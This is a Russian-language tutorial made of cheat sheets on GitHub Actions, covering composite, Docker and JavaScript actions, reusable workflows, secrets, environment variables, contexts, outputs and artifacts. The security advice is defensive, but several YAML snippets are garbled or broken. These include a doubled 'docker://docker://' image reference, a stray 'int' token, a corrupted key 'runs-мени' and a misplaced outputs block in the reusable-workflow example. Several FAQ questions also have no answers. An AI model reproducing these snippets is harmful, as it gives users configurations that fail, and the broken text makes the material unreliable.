1.  **Обязательный `shell`**: В обычном workflow GitHub сам подставляет `bash`. В **Composite Action** ты **обязан** явно прописывать `shell: bash` (или другой) для каждого шага `run`. Если забудешь — экшен упадет с невнятной ошибкой.
2.  **Область видимости (Scope)**: Все переменные окружения (`env`), которые ты объявил в основном workflow, доступны внутри, но если ты хочешь передать данные *из* экшена *в* основной workflow, используй только `outputs`.
3.  **Working Directory**: В Composite Actions нет автоматического изменения директории. Если твой экшен должен работать в подпапке, всегда прокидывай путь через `inputs` и используй `working-directory` внутри шагов.
4.  **Использование других экшенов**: Внутри Composite Action ты можешь использовать другие экшены (например, `actions/checkout`), но помни: это увеличивает "тяжесть" твоего экшена.

---

### ⚖️ Сравнение: Composite Actions vs Reusable Workflows
Это классический вопрос на собеседованиях.

| Характеристика | Composite Action | Reusable Workflow |
| :--- | :--- | :--- |
| **Уровень абстракции** | Низкий (группировка **шагов**) | Высокий (группировка **jobs**) |
| **Что внутри** | Набор `steps` | Набор `jobs` |
| **Сложность** | Легко создать, просто объединить шаги | Сложнее, требует отдельного YAML файла workflow |
| **Цель** | Устранение дублирования кода (DRY) | Создание стандартизированных пайплайнов (CI/CD шаблоны) |

**Правило большого пальца:** Если тебе нужно упростить последовательность действий внутри одного Job — делай **Composite Action**. Если ты хочешь создать стандартный процесс "Build -> Test -> Deploy" для всей компании — делай **Reusable Workflow**.

---

### ❓ FAQ (Частые вопросы)

**В: Можно ли в Composite Action использовать `env` на уровне всего экшена?**
*О: На уровне самого файла `action.yml` секция `env` не поддерживается так, как в workflow. Тебе нужно либо объявлять `env` внутри конкретного шага, либо передавать их через `inputs`.*

**В: Как протестировать свой Composite Action локально?**
*О: Напрямую — никак. Но ты можешь создать тестовый workflow в том же репозитории, который вызывает твой экшен из локальной папки (`uses: ./.github/actions/my-action`), и запускать его через `workflow_dispatch`.*

**В: Почему мой экшен не видит файлы, которые я создал в предыдущем шаге?**
*О: Проверь `working-directory`. Скорее всего, ты создаешь файлы в корне, а следующий шаг ищет их в другой директории. Всегда явно управляй путями.*

**В: Могу ли я использовать `outputs` из одного Composite Action в другом?**
*О: Да, но только если ты передашь их через цепочку вызовов. Первый экшен возвращает output -> основной workflow принимает его -> передает как input во второй экшен.*

# 🐳 Docker Container Actions: Полный гайд

### Что это такое?
**Docker Container Action** — это тип экшена, который запускается внутри заранее собранного Docker-образа. Вместо того чтобы на каждом шаге устанавливать зависимости (через `apt-get`, `pip` или `npm`), ты один раз упаковываешь всё необходимое в образ и просто вызываешь его.

**Суть:** Ты определяешь не *как* сделать (скрипты), а *в какой среде* это должно произойти.

---

### 🛠 Когда использовать (Senior Advice)
✅ **Используй, если:**
*   Тебе нужны специфические системные зависимости (например, `ffmpeg`, `imagemagick`, `aws-cli` определенной версии).
*   Ты хочешь обеспечить **идентичность** среды разработки и CI (Immutable Infrastructure).
*   Твой процесс требует сложной настройки окружения, которая занимает много времени при установке "на лету".

❌ **НЕ используй, если:**
*   Тебе нужно быстро протестировать простой скрипт (Docker-контейнер добавит лишнее время на `pull` образа).
*   Ты работаешь на Windows или macOS раннерах (Docker Actions работают **только на Linux**).
*   Образ весит несколько гигабайт (это убьет скорость твоего пайплайна).

---

### 🏗 Как это устроено (Анатомия)

Для создания Docker Action тебе нужен файл `action.yml` в корне репозитория.

**Минимальный шаблон `action.yml`:**
```yaml
name: 'My Super Tool'
description: 'Runs a complex task inside a container'
inputs:
  who-to-greet:
    description: 'Who to greet'
    required: true
runs:
  using: 'docker'
  image: 'docker://docker://my-user/my-custom-image:1.0.0'
  args:
    - '--name'
    - '${{ inputs.who-to-greet }}'
```

**Ключевые компоненты:**
1.  `using: 'docker'`: Говорит GitHub, что мы используем контейнер.
2.  `image`: Путь к образу в Docker Hub или GitHub Packages (CR). **Важно:** Всегда указывай конкретный тег или SHA, никогда не используй `:latest`.
3.  `args`: Аргументы, которые будут переданы в `ENTRYPOINT` твоего Docker-образа.

---

### ⚠️ Нюансы и "подводные камни" (Топ ошибок)

1.  **Проблема файловой системы:** Когда экшен запускается, GitHub автоматически монтирует рабочую директорию репозитория (`$GITHUB_WORKSPACE`) внутрь контейнера. Но помни: если твой Docker-образ ожидает файлы в `/app`, а GitHub положил их в `/github/workspace`, тебе нужно либо менять `WORKDIR` в Dockerfile, либо прокидывать пути через аргументы.
2.  **Сложность передачи данных (Outputs):** В контейнерном экшене ты не можешь просто так использовать `echo "::set-output..."`. Тебе нужно записывать данные в файлы внутри рабочей директории и затем считывать их, либо использовать специальные механизмы записи в `$GITHUB_OUTPUT` через оболочку.
3.  **Размер имеет значение:** Каждый раз, когда раннер скачивает твой образ, он тратит время. Если образ весит 2 ГБ, твой CI будет тормозить. Используй легковесные образы (Alpine, Slim).
4.  **Архитектура:** Если ты собираешь образ на Apple M1/M2 (ARM), а запускаешь в GitHub Actions (x86_64), экшен может упасть или работать крайне медленно через эмуляцию. Всегда делай `multi-arch` билды.

### ❓ FAQ (Частые вопросы)

**В: Могу ли я использовать Docker Container Action на Windows-раннере?**
**О:** Нет. Это фундаментальное ограничение GitHub Actions. Контейнерные экшены требуют Linux-ядра. Если нужен Windows, используй `JavaScript Action` или обычные `run` шаги.

**В: Как передать секреты внутрь контейнера?**

Внутри контейнера эта переменная будет доступна как обычная `ENV`.

**В: Что лучше: Docker Action или Composite Action?**
**О:** Если тебе нужно просто объединить несколько шагов `run` — бери **Composite**. Если тебе нужна изолированная среда с предустановленным софтом, который сложно ставить через `apt` — бери **Docker**.

**В: Как мне протестировать свой экшен локально?**
**О:** Используй инструмент [act](https://github.com/nektos/act). Он позволяет запускать GitHub Actions прямо на твоем компьютере в Docker-контейнерах, имитируя поведение GitHub.

# 🚀 JavaScript Actions: Профессиональная шпаргалка

**JavaScript Actions** — это самый быстрый и эффективный способ создания кастомных экшенов. В отличие от Docker Actions (которые запускают контейнер) или Composite Actions (которые просто группируют шаги), JS-экшены выполняют код Node.js напрямую на раннере. Это дает минимальный оверхед по времени и максимальную гибкость.

---

### 🏗️ Анатомия экшена
Любой JS Action состоит из трех обязательных компонентов:

1.  **`action.yml` (Манифест):** Описывает входные параметры (`inputs`), выходные данные (`outputs`) и указывает, что использовать Node.js.
2.  **`package.json`:** Стандартный файл Node.js для управления зависимостями.
3.  **`dist/index.js` (Скомпилированный код):** Это «сердце» экшена. **Важно:** Мы не пушим папку `node_modules`. Мы пушим один скомпилированный файл, в который включены все зависимости.

---

### 🛠️ Ключевые библиотеки (Твой инструментарий)
Чтобы не изобретать велосипед, используй официальный набор `@actions/` библиотек:

*   **`@actions/core`**: Самая важная либа. Позволяет читать `inputs`, записывать `outputs`, логировать ошибки и работать с секретами.
*   **`@actions/github`**: Дает доступ к контексту (payload события, информация о репозитории, PR, коммитах).
*   **`@actions/exec`**: Позволяет запускать shell-команды прямо из JS (замена `child_process.exec`).
*   **`@actions/glob`**: Удобный поиск файлов по маскам (например, `src/**/*.js`).
*   **`@actions/fs-extra`**: Расширенная работа с файловой системой.

---

### 🔄 Процесс разработки (Workflow)

1.  **Инициализация:** Создаешь проект, `npm init`.
2.  **Кодинг:** Пишешь логику на TypeScript или JavaScript, используя библиотеки выше.
3.  **Сборка (Bundling) — КРИТИЧЕСКИЙ ШАГ:** 
    Ты не можешь просто отправить `index.js` с кучей `require`. Тебе нужно использовать **`@vercel/ncc`**. Эта утилита берет твой код и все твои зависимости из `node_modules` и «схлопывает» их в один единственный файл `dist/index.js`.
    *Команда:* `npx @vercel/ncc build src/index.js -o dist`
4.  **Публикация:** Пушишь `action.yml`, `package.json` и папку `dist/` в репозиторий.

---

### 💡 Нюансы от Senior-инженера (Pro Tips)

*   **Версия Node.js:** Всегда указывай актуальную версию в `action.yml`. Сейчас стандартом становится `node20`. Старые версии (`node12/16`) скоро станут legacy.
*   **Обработка ошибок:** Никогда не оставляй пустые блоки `catch`. Используй `core.setFailed(error.message)`, чтобы GitHub пометил шаг как упавший (красный крестик). Если ты просто выведешь ошибку в консоль, workflow будет считаться успешным (зеленым), что смертельно для CI/CD.
*   **Безопасность:** Никогда не логируй `inputs`, если они могут содержать секреты. Используй `core.setSecret(value)`, чтобы GitHub замаскировал чувствительные данные в логах звездочками (`***`).
*   **Тестирование:** Пиши Unit-тесты (Jest/Vitest) для своего экшена. Если логика сложная, ты должен быть уверен, что изменение в `inputs` не сломает `outputs`.

**В: Почему нельзя просто запушить папку `node_modules`?**
**О:** Это плохая практика по трем причинам: во-первых, это раздует размер репозитория до гигабайт. Во-вторых, зависимости могут иметь разные бинарные файлы под разные ОС. В-третьих, это нарушает принцип чистоты кода. Используй `ncc` для бандлинга.

**В: Как передать данные из моего экшена обратно в основной Workflow?**

**В: Могу ли я использовать TypeScript?**

# 🛠 Шпаргалка: Reusable Workflows (Повторно используемые Workflow)

### 💡 Суть в двух словах
**Reusable Workflows** — это способ превратить твой YAML-файл в «функцию». Вместо того чтобы копипастить один и тот же код деплоя или тестирования в 20 разных репозиториев (или разных файлов одного репозитория), ты пишешь его один раз, а потом просто вызываешь по ссылке.

Это реализация принципа **DRY** (*Don't Repeat Yourself*) на уровне всей организации.

---

### 🏗 Как это устроено

#### 1. Создание "Функции" (Called Workflow)
Чтобы workflow стал переиспользуемым, в его триггере должен быть указан `workflow_call`.

```yaml
# .github/workflows/reusable-test.yml
on:
  workflow_call:
    inputs: # Параметры, которые мы передаем внутрь
      node-version:
        required: true
        type: string
    secrets: # Секреты, которые нужно пробросить
      api-token:
        required: true
    outputs: # То, что функция вернет обратно
      test-result:
        description: "Status of tests"

jobs:
  run-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Use Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
      # ... логика тестов ...
      - id: check
        run: echo "result=success" >> $GITHUB_OUTPUT
      
    outputs:
      test-result: ${{ jobs.run-tests.outputs.result }}
```

#### 2. Вызов "Функции" (Caller Workflow)
Основной workflow вызывает шаблон, передавая в него данные.

```yaml
# .github/workflows/main-pipeline.yml
jobs:
  call-test-logic:
    uses: my-org/my-repo/.github/workflows/reusable-test.yml@v1
    with:
int       node-version: '20'
    secrets:
      api-token: ${{ secrets.MY_GLOBAL_TOKEN }}
```

---

### ⚠️ Важные нюансы (Senior Level)

1.  **Secrets Inheritance (Наследование секретов):**
    *   По умолчанию вызываемый workflow **не видит** секреты вызывающего. 
    *   **Плохой путь:** Перечислять каждый секрет вручную в `secrets:`. Это неудобно при масштабировании.
    *   **Senior путь:** Использовать `secrets: inherit`. Это автоматически пробрасывает все секреты из контекста текущего workflow в вызываемый.

2.  **Версионирование (Versioning):**
    *   Никогда не ссылайся на ветку вроде `@main`. Если кто-то сломает `main`, у тебя упадут **все** пайплайны во всех репозиториях.
    *   Используй теги: `@v1`, `@v1.2.3` или конкретный SHA коммита. Это гарантирует стабильность (Immutable Infrastructure).

3.  **Разница между Reusable Workflows и Composite Actions:**
    *   **Composite Action:** Это просто набор *шагов* (`steps`). Он не может иметь свои `jobs`. Идеально для инкапсуляции логики установки софта.
    *   **Reusable Workflow:** Это полноценный процесс с целым деревом `jobs`, зависимостями (`needs`) и своей структурой. Идеально для оркестрации целых пайплайнов (Build -> Test -> Deploy).

4.  **Permissions (Права доступа):**
    *   Помни, что `GITHUB_TOKEN` в вызываемом workflow имеет те же права, что и в вызывающем. Если ты используешь `workflow_call`, убедись, что у вызывающего workflow достаточно прав для выполнения действий внутри шаблона.

---

### ❓ FAQ (Частые вопросы)

**В: Можно ли из Reusable Workflow вызвать другой Reusable Workflow?**
**О:** Да, это называется "вложенность". Но не делай цепочки глубже 2-3 уровней, иначе превратишь отладку в ад.

**В: Что делать, если я хочу передать массив данных в `inputs`?**
**О:** GitHub Actions пока плохо работает с типами данных, кроме `string`, `number`, `boolean`. Приходится передавать строку (например, JSON) и парсить её внутри workflow через `fromJSON()`.

**В: Почему мой вызываемый workflow не видит секреты, хотя я их прописал?**
**О:** Проверь область видимости. Если ты используешь `secrets: inherit`, убедись, что секрет определен в репозитории-вызывающем. Если передаешь явно — проверь правильность маппинга имен (в шаблоне имя `api-token`, а передаешь ты `MY_TOKEN`).

**В: Можно ли использовать Reusable Workflow для разных репозиториев?**
**О:** Да, это их главное предназначение. Но у репозитория-шаблона должны быть открыты права на чтение (Public или настроенные в организации), чтобы другие могли его "подтянуть".

# 🔐 Secrets Management: Ultimate Cheat Sheet

**Secrets** — это любые конфиденциальные данные: API-ключи, пароли от БД, токены доступа (SSH, AWS, Docker Hub), сертификаты. В GitHub Actions секреты никогда не должны храниться в коде (в `.yml` или `.txt`). Они хранятся в зашифрованном виде на стороне GitHub.

---

### 🏗️ 1. Уровни хранения (Scope)
Секреты можно создавать на трех уровнях. Важно понимать, какой выбрать:

1.  **Organization Secrets**: Глобальные секреты для всей компании. Если у тебя 50 репозиториев, ты один раз прописываешь ключ доступа к Artifactory здесь, и он доступен всем (если разрешено).
2.  **Repository Secrets**: Секреты конкретного репозитория. Самый частый вариант.
3.  **Environment Secrets**: **(Самый важный для Senior)**. Секреты привязаны к окружению (например, `production` или `staging`). 
    *   *Зачем?* Ты можешь сделать так, чтобы секрет `DB_PASSWORD` был доступен только тогда, когда деплой идет в среду `production`, и требовал ручного аппрува от лида.

---

### 🔑 2. Встроенный GITHUB_TOKEN
GitHub автоматически создает специальный токен для каждого запуска workflow.
*   **Плюсы**: Тебе не нужно создавать его вручную. Он живет только во время работы одного job.
*   try **Permissions**: Всегда ограничивай права этого токена через блок `permissions:`. Не давай ему права `write` на всё подряд, если тебе нужно только `read` для контента.

---

### 🚀 3. Как использовать (Syntax)
Доступ к секрету осуществляется через контекст `secrets`.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Use Secret
        env:
          # ПРАВИЛЬНЫЙ ПУТЬ: передаем секрет в переменную окружения шага
          API_KEY: ${{ secrets.MY_API_KEY }} 
        run: |
          ./deploy.sh --key $API_KEY
```

⚠️ **Никогда не делай так:** `run: echo "Key is ${{ secrets.MY_API_KEY }}"`. Хотя GitHub и маскирует секреты, это плохая практика, которая может привести к утечкам при манипуляциях со строками.

---

### 🛡️ 4. Продвинутые техники безопасности (Senior Level)

#### 🚫 Masking (Маскирование)
GitHub автоматически заменяет значения секретов в логах на `***`. 
*   **Нюанс**: Если ты закодируешь секрет в `base64` внутри шага, GitHub может его "не узнать" и выведет в лог открытым текстом. **Будь осторожен с трансформацией данных.**

#### ☁️ OIDC (OpenID Connect) — Забудь про долгоживущие ключи!
Это вершина безопасности. Вместо того чтобы хранить `AWS_ACCESS_KEY_ID` в GitHub Secrets, ты настраиваешь доверительные отношения между GitHub и AWS. 
*   GitHub выдает временный токен, который AWS принимает. 
*   **Результат**: У тебя вообще нет секретов в GitHub, которые можно украсть.

#### 💉 Injection Attacks (Инъекции)
Если ты используешь секрет, который пришел извне (например, из названия ветки или комментария к PR), злоумышленник может попытаться "сломать" твой скрипт. Всегда относись к внешним данным как к яду.

---

### 📝 Резюме: Best Practices
1.  **Принцип наименьших привилегий**: Используй `permissions:` в YAML, чтобы ограничить `GITHUB_TOKEN`.
2.  **Environment-specific secrets**: Для продакшена — только через Environments с ручным подтверждением (Manual Approval).
3.  **OIDC вместо паролей**: Если облако позволяет (AWS, GCP, Azure) — используй OIDC.
4.  **Передача через `env`**: Всегда прокидывай секреты в шаги через блок `env:`, а не напрямую в команду `run`.

---

### ❓ FAQ (Частые вопросы)

**В: Я вижу в логах `***`, значит я в безопасности?**
**О:** На 95% — да. Но помни, что если ты применишь к секрету функцию (например, `tr` или `sed`), маскировка может сломаться. Всегда проверяй, не меняешь ли ты структуру секрета перед использованием.

**В: Можно ли передать секрет из одного Workflow в другой?**
**О:** Напрямую — нет. Секреты не "протекают" между workflow. Тебе нужно либо использовать `workflow_call` (Reusable Workflows) и явно передавать их как `inputs`, либо использовать общие Organization Secrets.

**В: Что делать, если секрет был скоммичен в репозиторий по ошибке?**
**О:** 1. Немедленно удали его из истории Git (`git filter-repo` или BFG Repo-Cleaner). 2. **Самое главное:** Считай, что ключ уже украден. Перевыпусти (rotate) этот секрет везде! Удаление из истории не спасает, если кто-то успел сделать `git clone`.

# 🧠 Шпаргалка: Environment Variables (Переменные окружения) в GitHub Actions

**Environment Variables (env)** — это способ хранения пар `Ключ = Значение` для использования внутри твоих workflow. Это твой основной инструмент для конфигурации пайплейна без жесткого кодирования (hardcode) значений.

### 📍 1. Уровни области видимости (Scope & Precedence)
В GitHub Actions переменные могут быть объявлены на трех уровнях. Важно помнить правило: **чем ниже уровень, тем выше приоритет**. Если переменная с одним именем есть везде, победит та, что ближе к шагу.

1.  **Workflow level (Global):** Объявляются в начале файла. Доступны во всех `jobs` и всех `steps`.
2.  **Job level:** Объявляются внутри конкретной `job`. Доступны только в этой работе.
3.  **Step level:** Объявляются внутри конкретного `step`. Видны только в этом шаге.

**Иерархия приоритета (от низшего к высшему):**
`Workflow` ➡️ `Job` ➡️ `Step` (Шаг перекрывает всё).

---

### 🚀 2. Как использовать: Два способа доступа
Это самый важный момент, на котором сыпятся все. Есть два принципиально разных способа обратиться к переменной:

#### А) Через Context (GitHub Expression) — `${{ env.VAR_NAME }}`
Используется **внутри самого YAML-файла** (в `if`, в параметрах экшенов, в названиях путей). GitHub вычисляет это значение *до* того, как запустит скрипты.
*Пример:*
```yaml
if: ${{ env.NODE_VERSION == '18' }}
```

#### Б) Через Shell (Environment Variable) — `$VAR_NAME` или `${VAR_NAME}`
Используется **внутри блока `run`**. Здесь работает стандартный синтаксис твоей оболочки (bash, pwsh). GitHub просто прокидывает переменные в окружение операционной системы.
*Пример:*
```yaml
run: echo "Current version is $NODE_VERSION"
```

> **Senior Tip:** Никогда не используй `${{ env.VAR }}` внутри `run` для формирования команд, которые могут содержать ввод пользователя (риск инъекции). Используй `$VAR`.

---

### 🛠 3. Динамическое создание переменных (Dynamic Env)
Иногда тебе нужно вычислить значение в одном шаге и использовать его в другом. Ты не можешь просто написать `env: VAR=VAL` в середине выполнения, так как YAML статичен.

Для этого используется специальный файл `$GITHUB_ENV`. Запись в него — это единственный способ «прокинуть» переменную из текущего шага в последующие.

**Пример:**
```yaml
steps:
  - name: Calculate version
    run: |
      # Вычисляем что-то сложное
      NEW_VERSION="1.2.${{ github.run_number }}"
      # Записываем в специальный файл окружения
      echo "APP_VERSION=$NEW_VERSION" >> $GITHUB_ENV

  - name: Use version
    run: |
      # Теперь переменная доступна здесь!
      echo "The version is $APP_VERSION"
```

---

### ⚠️ 4. Нюансы и Безопасность (The Senior Way)

1.  **Secrets vs Env:** **Никогда** не храни пароли, токены или ключи в `env`. Переменные окружения — это открытый текст. Для чувствительных данных используй только `secrets`.
2.  **Перезапись:** Помни, что если ты определил `env` на уровне Workflow, но переопределил его в Job, старое значение «исчезнет» для этой работы.
3.  **Типы данных:** Все, что попадает в `env`, — это **строки**. Если тебе нужно передать массив или объект, придется использовать JSON и парсить его через `jq`.

---

### ❓ FAQ (Частые вопросы)

**В: Можно ли использовать переменную из `env` в условии `if`?**
О: Да, но только через синтаксис контекста: `if: ${{ env.MY_VAR == 'true' }}`. Обычный `$MY_VAR` в `if` работать не будет, так как `if` обрабатывается самим GitHub до запуска Shell.

**В: Как передать переменную из одного Job в другой?**
О: Переменные `env` живут только внутри своей работы (Job). Чтобы передать данные между разными работами, нужно использовать **Outputs** (выходы) на уровне Job или сохранять их в **Artifacts**.

**В: Что делать, если в значении переменной есть спецсимволы или пробелы?**
О: При записи в `$GITHUB_ENV` используй кавычки: `echo "MY_VAR='value with spaces'" >> $GITHUB_ENV`. Но будь осторожен с экранированием внутри самого YAML.

**В: В чем разница между `env` и `inputs`?**
О: `env` — это внутренние переменные процесса. `inputs` — это параметры, которые передаются в workflow извне (например, при ручном запуске `workflow_dispatch`).

# 🧠 Тема: Contexts (Контексты) в GitHub Actions

**Контексты** — это, по сути, «память» твоего workflow. Это объекты, которые содержат информацию о текущем запуске, репозитории, окружении, шагах и событиях. Если тебе нужно динамически изменить поведение пайплайна (например, использовать имя пользователя, ветку или результат предыдущего шага), тебе нужны контексты.

Доступ к ним осуществляется через синтаксис: `${{ <context_name>.<property> }}`.

---

### 📂 Основные виды контекстов

#### 1. `github` — Самый важный контекст
Содержит всё, что касается самого события (event), репозитория и текущего запуска.
*   `github.repository`: Имя репозитория (`owner/repo`).
*   `github.ref`: Ссылка на ветку или тег, который вызвал workflow (например, `refs/heads/main`).
*   `github.sha`: Хэш коммита, на котором запущен процесс.
*   `github.actor`: Имя пользователя, который запустил событие.
*   `github.event`: Полный JSON объект события (здесь лежат все данные из `push`, `pull_request` и т.д.).
*   `github.workflow`: Название твоего workflow.

#### 2. `env` — Переменные окружения
Доступ к переменным, которые ты определил через ключевое слово `env` на уровнях `workflow`, `job` или `step`.
*   Пример: `${{ env.MY_VAR }}`.

#### 3. `steps` — Результаты шагов
Позволяет получить доступ к данным, которые были выведены (outputs) предыдущими шагами.
*   **Важно:** Чтобы это работало, шаг должен явно объявить `outputs`.
*   Пример: `${{ steps.my_step_id.outputs.some_result }}`.

#### 4. `job` — Данные текущего задания
Содержит информацию о текущем job (например, его статус или результаты).
*   Пример: `${{ job.status }}` (может быть `success`, `failure`, `cancelled`).

#### `inputs` — Входные параметры
Используется в `workflow_dispatch` (ручной запуск) или `workflow_call` (вызов другого workflow). Это те аргументы, которые пользователь вводит при нажатии кнопки "Run workflow".
*   Пример: `${{ inputs.user_input }}`.

#### 6. `matrix` — Данные матрицы
Если ты используешь `strategy: matrix`, этот контекст содержит текущее значение итерации.
*   Пример: `${{ matrix.os }}` или `${{ matrix.node-version }}`.

#### 7. `vars` — Репозиторные переменные (Variables)
Это не секреты, а просто константы, которые ты настроил в Settings -> Secrets and variables -> Actions. В отличие от `env`, они доступны глобально для всего репозитория без объявления в YAML.
*   Пример: `${{ vars.API_URL }}`.

---

### ⚠️ Нюансы и «подводные камни» (Senior Tips)

1.  **Контекст vs Shell Variable:** Это самая частая ошибка.
    *   `${{ env.VAR }}` — это подстановка **до** того, как скрипт начал выполняться (на уровне GitHub).
    *   `$VAR` — это переменная внутри самой оболочки (bash/pwsh).
    *   *Ошибка:* Пытаться обратиться к `${{ env.MY_VAR }}` внутри `run:`, если ты не определил её через `env:` для этого шага или job.

2.  **Область видимости (Scope):**
    Переменная, объявленная в `env` на уровне `step`, **не будет доступна** в контексте `env` для другого `step`. Контексты иерархичны: `workflow` > `job` > `step`.

3.  **Передача данных между Job (The "Output" Trap):**
    Ты не можешь просто взять `${{ steps.id.outputs.val }}` в другом **Job**. Контекст `steps` живет только внутри одного задания. Чтобы передать данные из Job A в Job B, тебе нужно:
    1.  Использовать `outputs` на уровне `job`.
    2.  Использовать ключевое слово `needs: [job_a]`.

4.  **Безопасность:**
    Никогда не выводи (через `echo`) содержимое контекста `secrets` в логи. Хотя GitHub пытается их маскировать (заменять на `***`), при определенных манипуляциях со строками секрет может «утечь».

### ❓ FAQ (Часто задаваемые вопросы)

**В: Как мне передать значение из одного шага в другой внутри одного Job?**
**О:** Используй `steps.<step_id>.outputs`. В первом шаге напиши:
`echo "my_val=hello" >> $GITHUB_OUTPUT`, а во втором читай через `${{ steps.step_id.outputs.my_val }}`.

**В: В чем разница между `env` и `vars`?**
**О:** `env` — это динамические переменные, которые ты прописываешь прямо в YAML-файле или задаешь в процессе выполнения. `vars` — это статические настройки, хранящиеся в настройках репозитория (как конфигурация).

**В: Почему мой `${{ github.event.inputs.name }}` возвращает пустоту, хотя я запускаю workflow вручную?**
**О:** Проверь, как ты определил `inputs` в секции `on: workflow_dispatch`. Если ты используешь старый синтаксис или опечатался в имени, контекст будет пустым. Также помни, что для `workflow_dispatch` правильный путь — `${{ inputs.name }}`, а не через `github.event`.

**В: Можно ли использовать контексты внутри строк в `run:`?**
**О:** Да. Например: `run: echo "Deploying to ${{ env.TARGET_ENV }}"`. GitHub сначала подставит значение из контекста, а потом отправит команду в shell.

# 🧠 Шпаргалка: Inputs & Outputs в GitHub Actions

Если представить Workflow как программу, то **Inputs** — это аргументы функции, которые мы передаем на вход, а **Outputs** — это `return`, результат работы этой функции, который мы забираем для дальнейшего использования.

Передача данных может происходить на трех уровнях: **Step $\to$ Step**, **Job $\to$ Job** и **Workflow $\to$ Workflow**.

---

## 1. Уровень Step (Внутри одного Job)
Самый простой уровень. Один шаг выполнил работу, второй должен использовать результат.

*   **Как записать:** Мы используем специальный файл среды `$GITHUB_OUTPUT`.
*   **Синтаксис записи:** `echo "key=value" >> $GITHUB_OUTPUT`
*   **Как прочитать:** `${{ steps.ID_ШАГА.outputs.KEY }}`

**Пример:**
```yaml
jobs:
  my_job:
    runs-on: ubuntu-latest
    steps:
      - id: generator # Обязательно даем ID!
        run: echo "version=1.2.3" >> $GITHUB_OUTPUT

      - name: Use the value
        run: echo "Версия из предыдущего шага: ${{ steps.generator.outputs.version }}"
```

---

  ## 2. Уровень Job (Между разными Jobs)
Здесь новички чаще всего совершают ошибки. **Важно:** Вы не можете напрямую обратиться к `steps.ID.outputs` из другого Job. Данные нужно "пробросить" на уровень Job.

*   **Алгоритм:** 
    1. В первом Job объявляем секцию `outputs`.
    2. Привязываем значение конкретного шага к этому output-у.
    3. Во втором Job используем ключевое слово `needs`, чтобы дождаться первого и получить доступ к его результатам.

**Пример:**
```yaml
jobs:
  build_job:
    runs-on: ubuntu-latest
    outputs:
      build_id: ${{ steps.set_id.outputs.id }} # Пробрасываем из step в job
    steps:
      - id: set_id
        run: echo "id=abc-123" >> $GITHUB_OUTPUT

  deploy_job:
    runs-мени: ubuntu-latest
    needs: build_job # ОБЯЗАТЕЛЬНО, иначе доступа к outputs не будет
    steps:
      - run: echo "Деплоим билд с ID: ${{ needs.build_job.outputs.build_id }}"
```

---

## 3. Уровень Workflow (Reusable Workflows)
Когда мы создаем шаблонный workflow (который вызывается через `workflow_call`), нам нужно передавать в него параметры при запуске.

*   **Inputs:** Параметры, которые мы передаем *в* шаблон (например, имя ветки или окружение).
*   **Outputs:** Результаты, которые шаблон возвращает *наружу*.

**Пример (Вызываемый Workflow - `template.yml`):**
```yaml
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    outputs:
      status_message:
        value: ${{ jobs.process.outputs.msg }}

jobs:
  process:
    runs-on: ubuntu-latest
    outputs:
      msg: ${{ steps.make_msg.outputs.text }}
    steps:
      - id: make_msg
        run: echo "text=Deploying to ${{ inputs.environment }}" >> $GITHUB_OUTPUT
```

---

## ⚠️ Нюансы от Senior (То, на чем все валятся)

1.  **Типы данных:** В GitHub Actions **всё является строкой**. Если ты передашь число `10`, то при получении ты получишь `"10"`. Если нужно считать это как число для математики, придется конвертировать внутри скрипта (например, в `bash` или `python`).
2.  **Многострочные значения (Multiline Strings):** Обычный `echo "key=value" >> $GITHUB_OUTPUT` сломается, если `value` содержит переносы строк. 
    *   *Решение:* Используй "делимитеры" (EOF).
    ```bash
    run: |
      echo "my_multiline_var<<EOF" >> $GITHUB_OUTPUT
      echo "Строка 1" >> $GITHUB_OUTPUT
      echo "Строка 2" >> $GITHUB_OUTPUT
      echo "EOF" >> $GITHUB_OUTPUT
    ```
3.  **Безопасность (Security Risk):** **НИКОГДА** не передавай секреты (пароли, токены) через `outputs`. Outputs записываются в логи и видны всем, у кого есть доступ к просмотру workflow. Для передачи секретов используй только `secrets`.
4.  **Область видимости (Scope):** Помни про цепочку: `Step -> Job -> Needs -> Workflow`. Если ты забыл `needs`, твоя связь разорвана.

---

## ❓ FAQ (Частые вопросы)

**В: Я записал переменную в step, но в другом job её нет. Почему?**
**О:** Потому что `outputs` шага живут только внутри этого Job. Тебе нужно явно объявить их в секции `jobs.<job_id>.outputs`, как показано во втором пункте этой шпаргалки.

**В: Можно ли передать объект (JSON) через outputs?**
**О:** Да, но помни про "всё есть строка". Лучше всего упаковать данные в JSON-строку: `echo "data={\"id\":123}" >> $GITHUB_OUTPUT`. А на принимающей стороне распарсить её с помощью `jq`.

**В: Как передать input в reusable workflow?**
**О:** При вызове workflow через `uses` ты используешь секцию `with`:
```yaml
jobs:
  call-template:
    uses: ./.github/workflows/template.yml
    with:
      environment: 'production'
```

# 📦 Тема: Artifacts (Артефакты)

### Что это такое?
Представь конвейер на заводе. Один робот собирает деталь, а другой должен её покрасить. Но роботы работают в разных цехах (Jobs). Чтобы вторая деталь получила результат работы первого, первый должен положить её в специальный контейнер, который будет доступен второму. 

**Артефакты** — это те самые «контейнеры» с файлами (бинарники, отчеты о тестах, логи, собранные приложения), которые мы сохраняем после завершения Job, чтобы использовать их в других Job или скачать себе для анализа.

---

### 🛠 Основные инструменты
В GitHub Actions всё крутится вокруг двух официальных экшенов:
1.  `actions/upload-artifact`: «Упаковывает» файлы и отправляет их на сервер GitHub.
2.  `actions/download-artifact`: «Забирает» файлы из хранилища в текущую рабочую директорию.

---

### 🚀 Как это работает (Workflow)

Чтобы передать данные между Job, тебе **обязательно** нужно использовать ключевое слово `needs`. Если ты не укажешь зависимость, вторая Job может запуститься раньше, чем первая успеет загрузить артефакт.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Compile Code
        run: npm run build # Допустим, создается папка 'dist'

      - name: Upload Build Result
        uses: actions/upload-artifact@v4
        with:
          name: production-build  # Имя нашего "контейнера"
          path: dist/            # Что именно упаковываем
          retention-days: 5      # Сколько дней храним (по умолчанию 90)

  deploy:
    runs-on: ubuntu-latest
    needs: build # КРИТИЧЕСКИ ВАЖНО: ждем завершения job 'build'
    steps:
      - name: Download Build Result
        uses: actions/download-artifact@v4
        with:
          name: production-build
          path: deploy-folder   # Куда распаковать

      - name: Deploy
        run: ./deploy.sh --dir deploy-folder
```

---

